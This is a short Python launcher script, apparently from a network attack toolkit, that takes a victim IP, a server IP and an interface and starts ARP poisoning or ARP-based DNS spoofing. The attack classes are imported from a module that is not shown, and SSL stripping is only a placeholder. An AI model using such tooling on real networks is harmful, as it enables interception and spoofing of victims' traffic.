# Import necessary packages
import argparse
# Import attacks
import attacks.all as attacks

# Initialize parser
argumentParser = argparse.ArgumentParser()

# Positional arguments
argumentParser.add_argument('victimIP')
argumentParser.add_argument('serverIP')
argumentParser.add_argument('interface')

# Optional arguments
argumentParser.add_argument('-a', '--arp', action = 'store_true') # ARP Poisoning Attack Flag
argumentParser.add_argument('-da', '--dnsarp', action = 'store_true') # DNS (ARP) Spoofing Attack Flag
argumentParser.add_argument('-sa', '--sslarp', action = 'store_true') # SSL (ARP) Stripping Attack Flag

# Parse arguments
parseArgs = argumentParser.parse_args()
victimIP = parseArgs.victimIP 
serverIP = parseArgs.serverIP
interface = parseArgs.interface 
isARPPoisoningAttack = parseArgs.arp
isDNSARPStrippingAttack = parseArgs.dnsarp
isSSLARPStrippingAttack = parseArgs.sslarp

# Check flags
if (sum([isARPPoisoningAttack, isDNSARPStrippingAttack, isSSLARPStrippingAttack]) > 1):
    print('Multiple attacks cannot be executed at once')
    raise SystemExit(1)

# Start right attack
if isARPPoisoningAttack:
    attack = attacks.ARPPoisoning(victimIP, serverIP, interface)
    attack.execute()
elif isDNSARPStrippingAttack:
    attack = attacks.ARPMITMDNSSpoofing(victimIP, interface)
    attack.execute()
elif isSSLARPStrippingAttack:
    print('Implement SSL Stripping')
